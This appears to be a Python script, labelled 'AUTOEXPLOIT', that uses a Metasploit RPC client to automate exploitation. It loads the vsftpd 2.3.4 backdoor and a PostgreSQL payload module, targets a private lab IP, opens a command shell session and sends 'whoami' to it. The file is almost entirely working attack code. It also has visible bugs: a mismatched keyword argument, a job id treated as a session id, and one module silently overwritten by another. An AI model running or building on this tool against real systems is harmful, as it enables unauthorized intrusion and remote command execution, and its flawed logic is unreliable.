import subprocess
import logging
import asyncio
from pymetasploit3.msfrpc import MsfRpcClient
from database import ExploitDB


logging.basicConfig(level=logging.DEBUG, format='%(levelname)s: %(message)s')

class Console:
    def __init__(self, db: ExploitDB) -> None:
        self.db = db
        self.client = MsfRpcClient('yourpassword', ssl=True)
        self.exploit = None
        self.shells = {}

    def set_payload(self, payload_path):
        self.exploit = self.client.modules.use('exploit', payload_path)
        
    def set_arguments(self, arguments):
        for argument in arguments.keys():
            self.exploit[argument] = arguments[argument]

    async def run_payload(self, shell_path):
        exploit_result = self.exploit.execute(payload=shell_path)
        await asyncio.sleep(1)
        if exploit_result["job_id"] == None:
            logging.error("payload failed")
            return
        shell = self.client.sessions.session(str(exploit_result["job_id"]))
        self.shells[exploit_result["job_id"]] = shell
        logging.debug(exploit_result)
        return exploit_result["job_id"]

    def interact(self, session_id, command):
        shell = self.shells[session_id]
        shell.write(command)
        
    def get_sessions(self):
        return self.client.sessions.list

    async def test(self):
        logging.debug("before: "+str(self.client.sessions.list))
        self.set_payload('unix/ftp/vsftpd_234_backdoor')
        self.set_payload('exploit/linux/postgres/postgres_payload')
        self.set_arguments({
            "RHOSTS":"192.168.17.130"
        })
        session_id = await self.run_payload(payload='cmd/unix/interact')
        if session_id is None: return
        logging.debug("after: "+str(self.client.sessions.list))
        self.interact(session_id, "whoami")
        # print(client.sessions.list)
        # shell = client.sessions.session('1')
        # shell.write('whoami')
        # print(shell.read())

async def testing():

    db = ExploitDB()
    console = Console(db=db)
    await console.test()
    # await console.start_msfconsole()
    # await console.set_payload("exploit/linux/postgres/postgres_payload")
    # await console.set_argument("tt","a")
    # await console.set_argument("rhosts", "192.168.17.130")
    # await console.set_argument("lhost","eth0")
    # await console.run_payload()

logging.debug("STARTING AUTOEXPLOIT")
loop = asyncio.get_event_loop()
try:
    loop.run_until_complete(testing())
finally:
    loop.close()